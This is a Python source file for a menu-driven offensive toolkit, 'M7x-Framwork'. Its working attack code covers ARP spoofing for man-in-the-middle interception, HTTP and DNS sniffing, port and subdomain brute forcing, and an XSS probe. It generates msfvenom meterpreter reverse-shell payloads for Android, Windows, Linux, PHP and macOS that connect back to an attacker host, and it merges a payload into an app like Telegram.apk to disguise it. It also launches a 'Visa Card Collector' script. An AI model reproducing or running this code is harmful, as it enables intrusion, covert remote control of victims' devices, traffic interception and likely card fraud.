from scapy.layers import http
from bs4 import BeautifulSoup
from geoip import geolite2
from googlesearch import *
from scapy.all import *
import dns.resolver
import os, sys, re
import requests
import socket
import random

os.system('cls' if os.name == 'nt' else 'clear')

print("\n __  __ ____         ___                             _  ") 
print("|  \/  |__  |_ _____| __| _ __ _ _ ____ __ _____ _ _| |__")
print("| |\/| | / /\ \ /___| _| '_/ _` | '  \ V  V / _ \ '_| / /")
print("|_|  |_|/_/ /_\_\   |_||_| \__,_|_|_|_\_/\_/\___/_| |_\_\ ")
print("https://www.mafia7x.tech\n")

print("[01] Information Gathering")
print("[02] Network Scanner")
print("[03] Sniffing & Spoofing")
print("[04] Web Scanning")
print("[05] Exploit")
print("[06] Other Tools")
print("[00] Exit the M7x-Framwork\n")
mafia7x = input("[+] M7x-Framwork >")

if mafia7x == "1" or mafia7x == "01":
    print("\n[01] IP Location")
    print("[02] DNS Analysis")
    print("[03] User Recon")
    print("[00] Back to main menu\n")
    mafia7x_info = input("Information Gathering >")
    if mafia7x_info == "1" or mafia7x_info == "01":
        try:
            ip = input("\n[+] Enter the IP > ")
            locator = geolite2.lookup(ip)
            if locator is None:
                print("[+] Unkown IP")
            else:
                print(locator)
        except:
            sys.exit()
    if mafia7x_info == "2" or mafia7x_info == "02":
        url = input("\n[+] Enter the website > ")
        types = ["A","AAAA","MX","NS","SOA","SRV","CNAME"]
        for record in types:
            result = dns.resolver.query(url,record,raise_on_no_answer=False)
            if result.rrset is not None:
                print(result.rrset)
    if mafia7x_info == "3" or mafia7x_info == "03":
        username = input('\n[+] Enter the username > ')

        instagram = f'https://www.instagram.com/{username}'
        facebook = f'https://www.facebook.com/{username}'
        twitter = f'https://www.twitter.com/{username}'
        youtube = f'https://www.youtube.com/{username}'
        blogger = f'https://{username}.blogspot.com'
        google_plus = f'https://plus.google.com/s/{username}/top'
        reddit = f'https://www.reddit.com/user/{username}'
        wordpress = f'https://{username}.wordpress.com'
        pinterest = f'https://www.pinterest.com/{username}'
        github = f'https://www.github.com/{username}'
        tumblr = f'https://{username}.tumblr.com'
        flickr = f'https://www.flickr.com/people/{username}'
        steam = f'https://steamcommunity.com/id/{username}'
        vimeo = f'https://vimeo.com/{username}'
        soundcloud = f'https://soundcloud.com/{username}'
        disqus = f'https://disqus.com/by/{username}'
        medium = f'https://medium.com/@{username}'
        deviantart = f'https://{username}.deviantart.com'
        vk = f'https://vk.com/{username}'
        aboutme = f'https://about.me/{username}'
        imgur = f'https://imgur.com/user/{username}'
        flipboard = f'https://flipboard.com/@{username}'
        slideshare = f'https://slideshare.net/{username}'
        fotolog = f'https://fotolog.com/{username}'
        spotify = f'https://open.spotify.com/user/{username}'
        mixcloud = f'https://www.mixcloud.com/{username}'
        scribd = f'https://www.scribd.com/{username}'
        badoo = f'https://www.badoo.com/en/{username}'
        patreon = f'https://www.patreon.com/{username}'
        bitbucket = f'https://bitbucket.org/{username}'
        dailymotion = f'https://www.dailymotion.com/{username}'
        etsy = f'https://www.etsy.com/shop/{username}'
        cashme = f'https://cash.me/{username}'
        behance = f'https://www.behance.net/{username}'
        goodreads = f'https://www.goodreads.com/{username}'
        instructables = f'https://www.instructables.com/member/{username}'
        keybase = f'https://keybase.io/{username}'
        kongregate = f'https://kongregate.com/accounts/{username}'
        livejournal = f'https://{username}.livejournal.com'
        angellist = f'https://angel.co/{username}'
        last_fm = f'https://last.fm/user/{username}'
        dribbble = f'https://dribbble.com/{username}'
        codecademy = f'https://www.codecademy.com/{username}'
        gravatar = f'https://en.gravatar.com/{username}'
        pastebin = f'https://pastebin.com/u/{username}'
        foursquare = f'https://foursquare.com/{username}'
        roblox = f'https://www.roblox.com/user.aspx?username={username}'
        gumroad = f'https://www.gumroad.com/{username}'
        newsground = f'https://{username}.newgrounds.com'
        wattpad = f'https://www.wattpad.com/user/{username}'
        canva = f'https://www.canva.com/{username}'
        creative_market = f'https://creativemarket.com/{username}'
        trakt = f'https://www.trakt.tv/users/{username}'
        five_hundred_px = f'https://500px.com/{username}'
        buzzfeed = f'https://buzzfeed.com/{username}'
        tripadvisor = f'https://tripadvisor.com/members/{username}'
        hubpages = f'https://{username}.hubpages.com'
        contently = f'https://{username}.contently.com'
        houzz = f'https://houzz.com/user/{username}'
        blipfm = f'https://blip.fm/{username}'
        wikipedia = f'https://www.wikipedia.org/wiki/User:{username}'
        hackernews = f'https://news.ycombinator.com/user?id={username}'
        codementor = f'https://www.codementor.io/{username}'
        reverb_nation = f'https://www.reverbnation.com/{username}'
        designspiration = f'https://www.designspiration.net/{username}'
        bandcamp = f'https://www.bandcamp.com/{username}'
        colourlovers = f'https://www.colourlovers.com/love/{username}'
        ifttt = f'https://www.ifttt.com/p/{username}'
        ebay = f'https://www.ebay.com/usr/{username}'
        slack = f'https://{username}.slack.com'
        okcupid = f'https://www.okcupid.com/profile/{username}'
        trip = f'https://www.trip.skyscanner.com/user/{username}'
        ello = f'https://ello.co/{username}'
        tracky = f'https://tracky.com/user/~{username}'
        basecamp = f'https://{username}.basecamphq.com/login'
        
        WEBSITES = [instagram, facebook, twitter, youtube, blogger, google_plus, reddit,wordpress, pinterest, github, tumblr, flickr, steam, vimeo, soundcloud, disqus, medium, deviantart, vk, aboutme, imgur, flipboard, slideshare, fotolog, spotify,mixcloud, scribd, badoo, patreon, bitbucket, dailymotion, etsy, cashme, behance,goodreads, instructables, keybase, kongregate, livejournal, angellist, last_fm,dribbble, codecademy, gravatar, pastebin, foursquare, roblox, gumroad, newsground,wattpad, canva, creative_market, trakt, five_hundred_px, buzzfeed, tripadvisor, hubpages,contently, houzz, blipfm, wikipedia, hackernews, reverb_nation, designspiration,bandcamp, colourlovers, ifttt, ebay, slack, okcupid, trip, ello, tracky, basecamp]
        def search():
            print(f'[+] Searching for username:{username}')
            count = 0
            match = True
            for url in WEBSITES:
                r = requests.get(url)
                if r.status_code == 200:
                    if match == True:
                        print('[+] FOUND MATCHES')
                        match = False
                    print(f'{url} - {r.status_code} - OK')
                    if username in r.text:
                        print(f'POSITIVE MATCH: Username:{username} - text has been detected in url.')
                    else:
                        print(f'POSITIVE MATCH: Username:{username} - text has NOT been detected in url, could be a FALSE POSITIVE.')
                count += 1
            total = len(WEBSITES)
            print(f'FINISHED: A total of {count} MATCHES found out of {total} websites.')
        try:
            if __name__=='__main__':
                search()
        except:
            os.system("exit")
    if mafia7x_info == "0" or mafia7x_info == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "2" or mafia7x == "02":
    print("\n[01] Scan Local Devices")
    print("[02] Port Scanner")
    print("[03] Network Packet Analysis")
    print("[00] Back to main menu\n")
    mafia7x_network = input("[+] Network Scanner >")
    if mafia7x_network == "1" or mafia7x_network == "01":
        def scan(ip):
            exist =[]
            print("\n\tIP\t\t\t\t\tMAC")
            print("-------------------------------------------------------------")
            while True:
                try:
                    arp_req = ARP(pdst=ip)
                    brodcast = Ether(dst="ff:ff:ff:ff:ff:ff")
                    arp_brodcast = brodcast/arp_req
                    result = srp(arp_brodcast,timeout=1,verbose=False)[0]
                    lst = []
                    for element in result:
                        clients = {"ip":element[1].psrc,"mac":element[1].hwsrc}
                        lst.append(clients)
                        for i in lst:
                            if i["mac"] not in exist:
                                print("{} \t\t\t\t {} ".format(i['ip'],i['mac']))
                                exist.append(i['mac'])
                except:
                    sys.exit()
        ip=str(input("\n[+] Enter the IP router > "))
        scan(ip+"/24")
    if mafia7x_network == "2" or mafia7x_network == "02":
        try:
            target = input("\n[+] Enter the ip > ")
            ports = [19,20,21,22,23,24,25,53,67,69,80,123,137,138,139,161,443,990,989]
            for port in ports:
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(0.5)
                r = s.connect_ex((target,port))
                if r == 0:
                    service = socket.getservbyport(port)
                    print("--[ * {} * is open --> {} ]".format(port,service))    
                    s.close
        except:
            sys.exit()
    if mafia7x_network == "3" or mafia7x_network == "03":
        def get_serv(src_port,dst_port):
            try:
                service = socket.getservbyport(src_port)
            except:
                service = socket.getservbyport(dst_port)
                return service
        def locate(ip):
            loc = geolite2.lookup(ip)
            if loc is not None :
                return loc.country , loc.timezone
            else:
                return None  
        def analyzer(pkt):
            try:
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                loc_src = locate(src_ip)
                loc_dst = locate(dst_ip)
                if loc_src is not None :
                    country  = loc_src[0]
                    timezone = loc_src[1]
                elif loc_dst is not None :
                    country  = loc_dst[0]
                    timezone = loc_dst[1]
                else:
                    country  = "UNkNOWN"
                    timezone = "UNkNOWN" 
                    mac_src = pkt.src
                    mac_dst = pkt.dst
                    if pkt.haslayer(ICMP):
                        print("----------------------------------------")
                        print("ICMP PACKET...")
                        print("SRC-IP : " + src_ip)
                        print("DST-IP : " + dst_ip)        
                        print("SRC-MAC : " + mac_src)
                        print("DST-MAC : " + mac_dst)
                        print("TimeZone : " + timezone + " Country : " + country )
                        print("Packet Size : " + str(len(pkt[ICMP])))   
                        if pkt.haslayer(Raw):
                            print(pkt[Raw].load)
                            print("----------------------------------------")
                    else:
                        src_port = pkt.sport
                        dst_port = pkt.dport
                        service  = get_serv(src_port,dst_port) 
                        if pkt.haslayer(TCP):
                            print("----------------------------------------")
                            print("TCP PACKET...")
                            print("SRC-IP : " + src_ip)
                            print("DST-IP : " + dst_ip) 
                            print("SRC-MAC : " + mac_src)
                            print("DST-MAC : " + mac_dst)
                            print("SRC-PORT : " + str(src_port))
                            print("DST-PORT : " + str(dst_port))
                            print("TimeZone : " + timezone + " Country : " + country )
                            print("SERVICE : "+service)
                            print("Packet Size : " + str(len(pkt[TCP])))   
                            if pkt.haslayer(Raw):
                                print(pkt[Raw].load)
                                print("----------------------------------------")   
                        if pkt.haslayer(UDP):
                            print("----------------------------------------")
                            print("UDP PACKET...")
                            print("SRC-IP : " + src_ip)
                            print("DST-IP : " + dst_ip)  
                            print("SRC-MAC : " + mac_src)
                            print("DST-MAC : " + mac_dst)
                            print("SRC-PORT : " + str(src_port))
                            print("DST-PORT : " + str(dst_port))
                            print("TimeZone : " + timezone + " Country : " + country )
                            print("SERVICE : "+service)
                            print("Packet Size : " + str(len(pkt[UDP])))   
                            if pkt.haslayer(Raw):
                                print(pkt[Raw].load)
                                print("----------------------------------------")
            except:
                sys.exit()
        
        print("\n[01] Wi-Fi")
        print("[02] wlan0")
        mafia7x_wificard = input("\n[+] Enter your Wi-Fi card > ")
        if mafia7x_wificard == '1' or mafia7x_wificard == '01':
            print("[+] ************ STARTED *************** [+]")
            sniff(iface="Wi-Fi", prn=analyzer)
        if mafia7x_wificard == '2' or mafia7x_wificard == '02':
            print("[+] ************ STARTED *************** [+]")
            sniff(iface="wlan0", prn=analyzer)
    if mafia7x_network == "0" or mafia7x_network == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "3" or mafia7x == "03":
    print("\n[01] MITM Attack(DNS)")
    print("[02] MITM Attack(Http)")
    print("[03] Arp Spoofing")
    print("[00] Back to main menu\n")
    mafia7x_sniff = input("[+] Sniffing & Spoofing >")
    if mafia7x_sniff == "1" or mafia7x_sniff == "01":
        try:
            def packet(pkt):
                if pkt.haslayer(DNS):
                    if pkt.haslayer(DNSQR) and pkt.haslayer(IP):
                        packeter = "[+] " + str(pkt.getlayer(DNSQR).qname) + " | Target-SRC > " + str(pkt.getlayer(IP).src)
                        print(packeter)
            print("\n[01] Wi-Fi")
            print("[02] wlan0")
            mafia7x_wificard = input("\n[+] Enter your Wi-Fi card > ")
            if mafia7x_wificard == '1' or mafia7x_wificard == '01':
                print("[+] ************ STARTED *************** [+]")
                sniff(iface="Wi-Fi", store=0, prn=packet)
            if mafia7x_wificard == '2' or mafia7x_wificard == '02':
                print("[+] ************ STARTED *************** [+]")
                sniff(iface="wlan0", store=0, prn=packet)
        except:
            sys.exit()
    if mafia7x_sniff == "2" or mafia7x_sniff == "02":
        import scapy.all as scapy
        def sniffer(interface): 
            print("[+] ************ STARTED *************** [+]")
            scapy.sniff(iface=interface, store=False, prn=process)
        def process(packet):
            if packet.haslayer(http.HTTPRequest):
                print("[+] ",packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path) 
                if packet.haslayer(scapy.Raw):
                    request  = packet[scapy.Raw].load 
                    print("[*_*] ->->->->-> ",request)
        print("\n[01] Wi-Fi")
        print("[02] wlan0")
        mafia7x_wificard = input("\n[+] Enter your Wi-Fi card > ")
        if mafia7x_wificard == '1' or mafia7x_wificard == '01':
            sniffer("Wi-Fi")
        if mafia7x_wificard == '2' or mafia7x_wificard == '02':
            sniffer("wlan0")
    if mafia7x_sniff == "3" or mafia7x_sniff == "03":
        import scapy.all as scapy
        def get_mac(ip):
            arp_packet = scapy.ARP(pdst=ip)
            broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_broadcast_packet = broadcast_packet/arp_packet
            answered_list = scapy.srp(arp_broadcast_packet, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        def spoof(target_ip, spoof_ip):
            target_mac = get_mac(target_ip)
            packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
        try:
            target  = str(input("\n[+] Enter Target  IP > ")) 
            spoof_ip = str(input("[+] Enter Spoof IP > "))
            print("")
            while True:       
                spoof(target,spoof_ip)
                spoof(spoof_ip,target)
                print("[+] Packets IS Sent...")
                time.sleep(8)
        except KeyboardInterrupt:
            sys.exit()           
    if mafia7x_sniff == "0" or mafia7x_sniff == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "4" or mafia7x == "04":
    print("\n[01] Sql Scanner")
    print("[02] Xss Scanner")
    print("[03] Admin Page Finder")
    print("[04] Find Out Hidden Paths")
    print("[05] Know The Paths Inside The Site")
    print("[06] Know About Sub-Paths Within The Site")
    print("[00] Back to main menu\n")
    mafia7x_webscan = input("[+] Web Scanning >")
    if mafia7x_webscan == "1" or mafia7x_webscan == "01":
        try:
            word = input("\n[+] Enter the dork here > ")
            for url in search(word):
                print(url)
        except:
            sys.exit()
    if mafia7x_webscan == "2" or mafia7x_webscan == "02":
        try:
            target = input("\n[+] Enter target url+get_name... > ")
            payload = "<script>alert('XSS');</script>"
            req = requests.get(target + payload, "html.parser").text
            if payload in req:
                print("[+] XSS vulnerablity discovered!")
            else:
                print("[+] Don't found XSS")
        except:
            sys.exit()
    if mafia7x_webscan == "3" or mafia7x_webscan == "03":
        host = str(input("\n[+] Should be enter your host like : http://www.example.com \n[+] Enter your host > "))
        wordlist = open("Wordlist/Admin-page-list.txt","r")
        r = wordlist.read()
        words = r.splitlines()
        try:
            for word in words:    
                url = host+"/"+word
                req = requests.get(url,"html.parser")
                if req.status_code == 200 :   
                    print("[+] Found : "+ url )
        except:
            sys.exit()
    if mafia7x_webscan == "4" or mafia7x_webscan == "04":
        website = str(input("\n[+] Should be enter your host like : http://www.example.com \n[+] Enter your host > "))
        full_domain = website+"/robots.txt"
        try:
            page = requests.get(full_domain,"html.parser").text
            hiddens = re.findall("Disallow\: \S{1,}",page)
            for i in hiddens:
                link = "[+] "+website+i[10:]
                print(link)
        except:
            sys.exit()
    if mafia7x_webscan == "5" or mafia7x_webscan == "05":
        host = str(input("\n[+] Should be enter your host like : http://www.example.com \n[+] Enter your host > "))
        wordlist = open("Wordlist/Web-tracks-list.txt","r")
        r = wordlist.read()
        words = r.splitlines()
        try:
            for word in words:    
                url = host+"/"+word
                req = requests.get(url,"html.parser")
                if req.status_code == 200 :   
                    print("[+] Found : "+ url )
        except:
            sys.exit()
    if mafia7x_webscan == "6" or mafia7x_webscan == "06":
        host = str(input("\n[+] Should be enter your host like : example.com \n[+] Enter your host > "))
        f = open("Wordlist/Sub-domain-list.txt","r")
        r = f.read()
        subdomains = r.splitlines()
        for sub in subdomains:
            domain = "http://"+ sub + "." + host
            try:
                req =  requests.get(domain,"html.parser")
                if req.status_code == 200:
                    print("[+] Discovered subdomain: "+domain)
            except requests.ConnectionError:
                pass
            except KeyboardInterrupt:
                sys.exit()
    if mafia7x_webscan == "0" or mafia7x_webscan == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "5" or mafia7x == "05":
    print("\n[01] Vulner Scanner")
    print("[02] Exploitation of devices")
    print("[03] Merge payload to file")
    print("[00] Back to main menu\n")
    mafia7x_exploit = input("[+] Exploit >")
    if mafia7x_exploit == "1" or mafia7x_exploit == "01":
        try:
            ip = input("\n[+] Enter the ip > ")
            os.system("nmap "+ip+" --script=vuln")
        except:
            sys.exit()
    if mafia7x_exploit == "2" or mafia7x_exploit == "02":
        try:
            print("\nNote:To run this tool, you must have metasploit")
            print("[01] Android")
            print("[02] Windows")
            print("[03] Linux")
            print("[04] Web")
            print("[05] Mac")
            payload = input('\n[+] Enter the option > ')
            lhost = input('[+] Enter LHOST > ')
            lport = input('[+] Enter LPORT > ')
            name = input('[+] Enter a payload name > ')
            if payload == '1' or payload == '01':
                android='msfvenom -p android/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' R > Payload/'+name+'.apk'
                os.system(android)
                print("\nNow you have to apply the following commands:")
                print("$ msfconsole")
                print("$ use multi/handler")
                print("$ set payload android/meterpreter/reverse_tcp")
                print("$ set LHOST "+lhost)
                print("$ set LPORT PORT "+lport)
                print("$ run")
            if payload == '2' or payload == '02':
                win='msfvenom -p windows/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' -f exe > Payload/'+name+'.exe'
                os.system(win)
                print("\nNow you have to apply the following commands:")
                print("$ msfconsole")
                print("$ use multi/handler")
                print("$ set payload windows/meterpreter/reverse_tcp")
                print("$ set LHOST "+lhost)
                print("$ set LPORT PORT "+lport)
                print("$ run")
            if payload == '3' or payload == '03':
                linux86='msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST='+lhost+' LPORT='+lport+' -f elf > Payload/'+name+'x86.elf'
                linux64='msfvenom -p linux/x64/meterpreter/shell_reverse_tcp LHOST='+lhost+' LPORT='+lport+' -f elf > Payload/'+name+'x64.elf'
                os.system(linux86)
                os.system(linux64)    
                print("\nNow you have to apply the following commands:")
                print("$ msfconsole")
                print("$ use multi/handler")
                print("$ set payload linux/x86/meterpreter/reverse_tcp or set payload linux/x64/meterpreter/shell_reverse_tcp")
                print("$ set LHOST "+lhost)
                print("$ set LPORT PORT "+lport)
                print("$ run")
            if payload == '4' or payload == '04':
                web='msfvenom -p php/meterpreter_reverse_tcp LHOST='+lhost+' LPORT='+lport+' -f raw > Payload/'+name+'.php'
                os.system(web)
                print("\nNow you have to apply the following commands:")
                print("$ msfconsole")
                print("$ use multi/handler")
                print("$ set payload php/meterpreter_reverse_tcp")
                print("$ set LHOST "+lhost)
                print("$ set LPORT PORT "+lport)
                print("$ run")
            if payload == '5' or payload == '05':
                mac='msfvenom -p osx/x86/shell_reverse_tcp LHOST='+lhost+' LPORT='+lport+' -f macho > Payload/'+name+'.macho'
                os.system(mac)
                print("\nNow you have to apply the following commands:")
                print("$ msfconsole")
                print("$ use multi/handler")
                print("$ set payload osx/x86/shell_reverse_tcp")
                print("$ set LHOST "+lhost)
                print("$ set LPORT PORT "+lport)
                print("$ run")
        except:
            sys.exit()
    if mafia7x_exploit == "3" or mafia7x_exploit == "03":
        try:
            print("\n[+] Note: You have to type the path of the files you want to merge or move the files to this path and write it directly")
            print("[+] Example > Telegram.apk")
            file = input("[+] Enter the file > ")
            print("\n[+] Example > Payload-Telegram.apk")
            payload = input("[+] Enter the payload > ")
            print("\n[+] Example > Telegram.apk")
            result = input("[+] Enter the output file with the formula > ")
            os.system("\ncat "+file+" "+payload+" > "+result)
        except:
            sys.exit()
    if mafia7x_exploit == "0" or mafia7x_exploit == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "6" or mafia7x == "06":
    print("\n[01] Visa Card Collector")
    print("[02] Proxy Collector")
    print("[00] Back to main menu\n")
    mafia7x_other = input("Information Gathering >")
    if mafia7x_other == "1" or mafia7x_other == "01":
        subprocess.call("php Script/Card.php")
        
    if mafia7x_other == "2" or mafia7x_other == "02":
        print("\n[01] Http")
        print("[02] Https")
        print("[03] Socks4")
        print("[04] Socks5")
        input_proxy = input("\n[+] What proxy do you want > ")
        if input_proxy == '1' or input_proxy == '01':
            url = "https://github.com/ShiftyTR/Proxy-List/blob/master/http.txt"
            req = requests.get(url).text
            soup = BeautifulSoup(req, 'html.parser')
            find = soup.find_all("td")
            for proxy in find:
                print("[+] Find Proxy > " + proxy.text)
        if input_proxy == '2' or input_proxy == '02':
            url = "https://github.com/ShiftyTR/Proxy-List/blob/master/https.txt"
            req = requests.get(url).text
            soup = BeautifulSoup(req, 'html.parser')
            find = soup.find_all("td")
            for proxy in find:
                print("[+] Find Proxy > " + proxy.text)
        if input_proxy == '3' or input_proxy == '03':
            url = "https://github.com/ShiftyTR/Proxy-List/blob/master/socks4.txt"
            req = requests.get(url).text
            soup = BeautifulSoup(req, 'html.parser')
            find = soup.find_all("td")
            for proxy in find:
                print("[+] Find Proxy > " + proxy.text)
        if input_proxy == '4' or input_proxy == '04':
            url = "https://github.com/ShiftyTR/Proxy-List/blob/master/socks5.txt"
            req = requests.get(url).text
            soup = BeautifulSoup(req, 'html.parser')
            find = soup.find_all("td")
            for proxy in find:
                print("[+] Find Proxy > " + proxy.text)
    if mafia7x_other == "0" or mafia7x_other == "00":
        os.system("exit")
        os.system("python M7x-Framwork.py")
if mafia7x == "0" or mafia7x == "00":
    os.system("exit")